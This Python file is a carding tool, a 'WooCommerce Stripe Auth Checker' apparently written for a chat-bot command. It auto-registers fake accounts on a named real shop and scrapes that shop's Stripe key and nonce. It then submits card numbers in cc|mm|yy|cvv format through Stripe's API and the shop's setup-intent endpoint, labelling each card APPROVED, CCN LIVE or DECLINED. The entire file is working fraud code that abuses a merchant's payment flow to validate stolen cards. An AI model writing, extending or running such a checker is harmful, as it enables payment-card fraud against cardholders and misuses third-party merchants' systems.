"""
WooCommerce Stripe Auth Checker for /au1 and /mau1
===================================================
Uses booth-box.com style flow with automatic registration.
Response format matches /au and /mau commands.
"""

import asyncio
import aiohttp
import random
import string
import re
import json
from typing import Dict, Optional, Tuple
from bs4 import BeautifulSoup
import time


# WooCommerce sites to try (legacy - not used in /au or /mau)
WC_SITES = [
    "https://grownetics.com",
    # Legacy checker - use nomade_checker or grownetics_checker instead
]

# Request timeout
REQUEST_TIMEOUT = 60


def generate_random_email() -> str:
    """Generate a random email address."""
    chars = string.ascii_lowercase + string.digits
    username = ''.join(random.choices(chars, k=10))
    domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com']
    return f"{username}@{random.choice(domains)}"


def generate_random_password() -> str:
    """Generate a random strong password."""
    chars = string.ascii_letters + string.digits + "!@#$%^&*"
    return ''.join(random.choices(chars, k=12))


class WCStripeAuth1:
    """
    WooCommerce Stripe Auth Checker with auto-registration.
    Booth-box style implementation.
    """
    
    def __init__(self, site_url: str = None):
        self.site_url = (site_url or WC_SITES[0]).rstrip('/')
        self.stripe_pk = None
        self.nonce = None
        self.email = None
        self.password = None
    
    def _get_headers(self, referer: str = "") -> Dict[str, str]:
        """Get standard request headers."""
        return {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "accept-language": "en-US,en;q=0.9",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
            "referer": referer or self.site_url,
            "sec-ch-ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
        }
    
    async def check_card(self, card: str, month: str, year: str, cvv: str) -> Dict:
        """
        Complete card check process with auto-registration.
        
        Returns:
            Dict with: success, response, message, card, payment_method_id, etc.
        """
        fullcc = f"{card}|{month}|{year}|{cvv}"
        start_time = time.time()
        
        result = {
            "success": False,
            "response": "UNKNOWN",
            "message": "Unknown error",
            "card": fullcc,
            "payment_method_id": None,
            "login_email": None,
            "login_password": None,
            "site": self.site_url,
        }
        
        timeout = aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
        connector = aiohttp.TCPConnector(ssl=False)
        
        try:
            async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
                headers = self._get_headers()
                
                # Step 1: Get registration page and nonce
                async with session.get(f'{self.site_url}/my-account/', headers=headers) as resp:
                    html = await resp.text()
                
                soup = BeautifulSoup(html, 'html.parser')
                reg_form = soup.find('form', {'class': 'woocommerce-form-register'})
                if not reg_form:
                    reg_form = soup.find('form', {'class': 'register'})
                
                if not reg_form:
                    result["response"] = "SITE_ERROR"
                    result["message"] = "Registration form not found"
                    return result
                
                # Get hidden fields
                form_data = {}
                for inp in reg_form.find_all('input'):
                    name = inp.get('name')
                    value = inp.get('value', '')
                    if name:
                        form_data[name] = value
                
                # Generate credentials
                self.email = generate_random_email()
                self.password = generate_random_password()
                result["login_email"] = self.email
                result["login_password"] = self.password
                
                form_data.update({
                    'email': self.email,
                    'password': self.password,
                    'register': 'Register',
                })
                
                # Submit registration
                reg_headers = {
                    **self._get_headers(f'{self.site_url}/my-account/'),
                    "content-type": "application/x-www-form-urlencoded",
                    "origin": self.site_url,
                }
                
                async with session.post(f'{self.site_url}/my-account/', headers=reg_headers, data=form_data, allow_redirects=True) as resp:
                    await resp.text()
                
                # Step 2: Get Stripe key and nonce from add-payment-method page
                async with session.get(f'{self.site_url}/my-account/add-payment-method/', headers=headers) as resp:
                    pm_html = await resp.text()
                
                # Extract Stripe public key
                pk_match = re.search(r'pk_(live|test)_[0-9a-zA-Z]+', pm_html)
                if not pk_match:
                    result["response"] = "SITE_ERROR"
                    result["message"] = "Could not extract Stripe key"
                    return result
                
                self.stripe_pk = pk_match.group(0)
                
                # Extract add_card_nonce or setup intent nonce
                nonce_match = re.search(r'(?:add_card_nonce|createAndConfirmSetupIntentNonce)":"([^"]+)"', pm_html)
                if not nonce_match:
                    result["response"] = "SITE_ERROR"
                    result["message"] = "Could not extract nonce"
                    return result
                
                self.nonce = nonce_match.group(1)
                
                # Step 3: Create payment method via Stripe API
                # Ensure year is 2 digits
                exp_year = year[-2:] if len(year) == 4 else year
                
                stripe_headers = {
                    "accept": "application/json",
                    "content-type": "application/x-www-form-urlencoded",
                    "origin": "https://js.stripe.com",
                    "referer": "https://js.stripe.com/",
                    "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
                }
                
                pm_data = {
                    "type": "card",
                    "card[number]": card,
                    "card[cvc]": cvv,
                    "card[exp_year]": exp_year,
                    "card[exp_month]": month,
                    "billing_details[address][postal_code]": "10001",
                    "billing_details[address][country]": "US",
                    "billing_details[name]": " ",
                    "billing_details[email]": self.email,
                    "payment_user_agent": "stripe.js/cba9216f35; stripe-js-v3/cba9216f35; split-card-element",
                    "key": self.stripe_pk,
                    "_stripe_version": "2024-06-20",
                }
                
                async with session.post("https://api.stripe.com/v1/payment_methods", headers=stripe_headers, data=pm_data) as resp:
                    pm_result = await resp.json()
                
                if "error" in pm_result:
                    error = pm_result["error"]
                    error_code = error.get("code", "unknown")
                    error_msg = error.get("message", "Unknown error")
                    
                    result["message"] = error_msg
                    
                    # Classify based on Stripe error codes
                    ccn_patterns = ["incorrect_cvc", "invalid_cvc", "incorrect_zip", "postal_code_invalid", "insufficient"]
                    if error_code in ccn_patterns or any(x in error_msg.lower() for x in ["cvc", "security code", "zip", "postal", "insufficient"]):
                        result["success"] = True
                        result["response"] = "CCN_LIVE"
                    else:
                        result["response"] = "DECLINED"
                    
                    return result
                
                pm_id = pm_result.get("id")
                if not pm_id:
                    result["response"] = "PM_ERROR"
                    result["message"] = "No payment method ID"
                    return result
                
                result["payment_method_id"] = pm_id
                
                # Step 4: Confirm setup intent
                confirm_headers = {
                    "accept": "application/json, text/javascript, */*; q=0.01",
                    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "origin": self.site_url,
                    "referer": f"{self.site_url}/my-account/add-payment-method/",
                    "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
                    "x-requested-with": "XMLHttpRequest",
                }
                
                # Try both endpoint formats
                confirm_data = {
                    "wc-stripe-payment-method": pm_id,
                    "wc-stripe-payment-type": "card",
                    "_ajax_nonce": self.nonce,
                }
                
                # Try setup_intent endpoint first
                async with session.post(
                    f"{self.site_url}/?wc-ajax=wc_stripe_create_and_confirm_setup_intent",
                    headers=confirm_headers,
                    data={
                        "action": "create_and_confirm_setup_intent",
                        **confirm_data
                    }
                ) as resp:
                    confirm_text = await resp.text()
                
                # If that didn't work, try the older endpoint
                if "success" not in confirm_text.lower() and "error" not in confirm_text.lower():
                    confirm_data2 = {
                        "stripe_source_id": pm_id,
                        "nonce": self.nonce,
                    }
                    async with session.post(
                        f"{self.site_url}/?wc-ajax=wc_stripe_create_setup_intent",
                        headers=confirm_headers,
                        data=confirm_data2
                    ) as resp:
                        confirm_text = await resp.text()
                
                result["raw_response"] = confirm_text
                
                # Parse the confirmation result
                try:
                    confirm_json = json.loads(confirm_text)
                    
                    if confirm_json.get("success") == True:
                        result["success"] = True
                        result["response"] = "APPROVED"
                        result["message"] = "Stripe Auth 0.0$ ✅"
                    else:
                        # Parse error from data
                        data = confirm_json.get("data", {})
                        error = data.get("error", {})
                        error_msg = error.get("message", confirm_text[:100])
                        
                        result["message"] = error_msg
                        
                        # Classify the response
                        error_upper = error_msg.upper()
                        
                        # CCN Live patterns
                        ccn_patterns = [
                            "SECURITY CODE", "CVC", "CVV", "INCORRECT_CVC",
                            "POSTAL CODE", "ZIP", "ADDRESS", "AVS",
                            "AUTHENTICATION", "3D SECURE", "3DS",
                            "INSUFFICIENT FUNDS", "NSF", "LIMIT",
                        ]
                        
                        if any(x in error_upper for x in ccn_patterns):
                            result["success"] = True
                            result["response"] = "CCN_LIVE"
                        elif any(x in error_upper for x in [
                            "DECLINED", "DECLINE", "REJECTED", "EXPIRED",
                            "LOST", "STOLEN", "FRAUD", "DO NOT HONOR",
                            "PICKUP", "RESTRICTED", "NOT PERMITTED"
                        ]):
                            result["response"] = "DECLINED"
                        else:
                            result["response"] = "DECLINED"
                            
                except json.JSONDecodeError:
                    # Check text response
                    if "success" in confirm_text.lower() or "thank you" in confirm_text.lower():
                        result["success"] = True
                        result["response"] = "APPROVED"
                        result["message"] = "Stripe Auth 0.0$ ✅"
                    elif "error" in confirm_text.lower():
                        result["response"] = "DECLINED"
                        result["message"] = confirm_text[:80]
                    else:
                        result["message"] = confirm_text[:80]
                
                return result
                
        except aiohttp.ClientError as e:
            result["response"] = "NETWORK_ERROR"
            result["message"] = f"Network: {str(e)[:40]}"
            return result
        except asyncio.TimeoutError:
            result["response"] = "TIMEOUT"
            result["message"] = "Request timed out"
            return result
        except Exception as e:
            result["response"] = "EXCEPTION"
            result["message"] = str(e)[:80]
            return result


async def check_stripe_auth1(fullcc: str) -> Dict:
    """
    Check a card using WC Stripe Auth (booth-box style).
    
    Args:
        fullcc: Card in format cc|mm|yy|cvv or cc|mm|yyyy|cvv
        
    Returns:
        Result dictionary
    """
    parts = fullcc.replace(" ", "").split("|")
    if len(parts) != 4:
        return {
            "success": False,
            "response": "INVALID_FORMAT",
            "message": "Card must be in format: cc|mm|yy|cvv",
            "card": fullcc,
            "site": WC_SITES[0]
        }
    
    card, month, year, cvv = parts
    
    # Normalize month
    if len(month) == 1:
        month = "0" + month
    
    # Normalize year
    if len(year) == 2:
        year = "20" + year
    
    # Try each site until one works
    last_result = None
    for site in WC_SITES:
        checker = WCStripeAuth1(site)
        result = await checker.check_card(card, month, year, cvv)
        last_result = result
        
        # If we got a real response, return it
        if result["response"] not in ["SITE_ERROR", "NETWORK_ERROR", "TIMEOUT"]:
            return result
    
    return last_result or {
        "success": False,
        "response": "ALL_SITES_FAILED",
        "message": "All sites failed",
        "card": fullcc
    }


def determine_status1(result: Dict) -> str:
    """
    Determine the display status from result.
    
    Returns:
        Status string: "APPROVED", "CCN LIVE", "DECLINED", or "ERROR"
    """
    response = result.get("response", "UNKNOWN").upper()
    
    if response == "APPROVED":
        return "APPROVED"
    elif response == "CCN_LIVE" or response == "CCN LIVE":
        return "CCN LIVE"
    elif response in ["DECLINED", "DECLINE"]:
        return "DECLINED"
    else:
        return "ERROR"


# Test function
if __name__ == "__main__":
    async def test():
        print("Testing WC Stripe Auth1...")
        result = await check_stripe_auth1("4242424242424242|12|2026|123")
        print(f"Result: {json.dumps(result, indent=2)}")
    
    asyncio.run(test())
